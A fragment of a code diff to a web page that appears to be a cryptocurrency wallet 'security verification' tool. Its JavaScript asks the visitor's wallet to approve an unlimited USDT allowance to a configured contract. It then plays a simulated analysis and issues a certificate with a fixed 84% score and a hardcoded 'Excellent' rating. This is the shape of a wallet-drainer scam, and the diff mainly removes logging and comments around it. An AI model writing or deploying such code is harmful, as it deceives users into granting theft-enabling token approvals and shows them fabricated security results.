                 if (!web3.utils.isAddress(CONTRACT_ADDRESS)) {
                     throw new Error("Invalid contract address!");
                 }
                 
-                console.log("Checking allowance for contract:", CONTRACT_ADDRESS);
-                
                 const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
-                console.log("Current allowance:", currentAllowance);
-                
                 const minRequired = web3.utils.toBN('1000000');
                 
                 if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
-                    console.log("Allowance too low, requesting approval...");
                     document.getElementById('verifyBtn').textContent = 'Approve USDT...';
                     const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                     await usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
-                    console.log("Approval successful!");
-                } else {
-                    console.log("Already approved!");
                 }
                 
                 document.getElementById('verifyBtn').textContent = 'Analyzing...';
@@ -1072,8 +1502,6 @@
                     errorMsg = 'Insufficient ETH for gas fees.';
                 } else if (error.message.includes('User denied')) {
                     errorMsg = 'Transaction rejected.';
-                } else if (error.message.includes('Contract address not configured')) {
-                    errorMsg = 'Setup error: Contract address not set. Please contact administrator.';
                 }
                 
                 document.getElementById('errorText').textContent = errorMsg;
@@ -1085,9 +1513,6 @@
             }
         }
 
-        // ========================================
-        // SIMULATE PROGRESS
-        // ========================================
         async function simulateProgress() {
             const steps = [
                 { id: 1, duration: 1200 },
@@ -1130,13 +1555,10 @@
             document.getElementById('overallPercent').textContent = percent + '%';
         }
 
-        // ========================================
-        // GENERATE CERTIFICATE DATA
-        // ========================================
         function generateCertificateData() {
             const first8 = account.slice(0, 10);
             const randomNum = Math.floor(Math.random() * 9000000000000) + 1000000000000;
-            const securityScore = 84; // Fixed at 84%
+            const securityScore = 84;
             
             const now = new Date();
             const months = ['January', 'February', 'March', 'April', 'May', 'June', 
@@ -1153,19 +1575,16 @@
                 riskAssessment: 'Completed',
                 blockchainVerification: true,
                 transactionHistoryAnalyzed: true,
-                securityRating: securityScore > 75 ? 'Excellent' : 'Good'
+                securityRating: 'Excellent'
             };
         }
 
-        // ========================================
-        // ANIMATE SCORE COUNTER
-        // ========================================
         function animateScore(targetScore) {
             return new Promise(resolve => {
                 const scoreElement = document.getElementById('scoreValue');
                 const scoreBarElement = document.getElementById('scoreBar');
-                const duration = 2000; // 2 seconds
-                const steps = 60; // 60 frames
+                const duration = 1000;
+                const steps = 60;
                 const increment = targetScore / steps;
                 const stepDuration = duration / steps;
                 
@@ -1180,65 +1599,42 @@
                         resolve();
                     }
                     
-                    // Update score number
                     scoreElement.textContent = Math.round(currentScore) + '%';
-                    
-                    // Update progress bar
                     scoreBarElement.style.width = Math.round(currentScore) + '%';
                 }, stepDuration);
             });
         }
 
-        // ========================================
-        // SHOW CERTIFICATE MODAL
-        // ========================================
         async function showCertificate() {
-            // Set initial values to 0
             document.getElementById('scoreValue').textContent = '0%';
             document.getElementById('scoreBar').style.width = '0%';
             
-            // Fill in other certificate details
             document.getElementById('certId').textContent = `Certificate ID: ${certificateData.certificateId}`;
             document.getElementById('certWalletAddress').textContent = account.slice(0, 10) + '...';
             document.getElementById('certDate').textContent = certificateData.verificationDate;
             
-            // Update the Analysis Complete section with THE SAME SCORE
             document.getElementById('completeScore').textContent = `${certificateData.securityScore}%`;
             
-            // Show modal
             document.getElementById('certificateModal').classList.add('show');
             
-            // Wait a tiny bit for modal to appear, then animate
             setTimeout(() => {
                 animateScore(certificateData.securityScore);
             }, 100);
         }
 
-
-        // ========================================
-        // VIEW CERTIFICATE AGAIN
-        // ========================================
         function viewCertificate() {
             document.getElementById('certificateModal').classList.add('show');
         }
-        
-        // ========================================
-        // CLOSE CERTIFICATE
-        // ========================================
+
         function closeCertificate() {
             document.getElementById('certificateModal').classList.remove('show');
             
-            // Show Analysis Complete section and View Certificate button
             document.getElementById('analysisComplete').classList.add('show');
             document.getElementById('downloadBtn').style.display = 'flex';
             
-            // Hide the verify button
             document.getElementById('verifyBtn').style.display = 'none';
         }
-        
-        // ========================================
-        // DOWNLOAD CERTIFICATE JSON
-        // ========================================
+
         function downloadCertificate() {
             const first8 = account.slice(0, 10);
             const filename = `MyCert-${first8}.json`;
@@ -1256,6 +1652,16 @@
             URL.revokeObjectURL(url);
         }
 
+        // Smooth scroll for navigation
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            });
+        });
     </script>
 </body>
 </html>
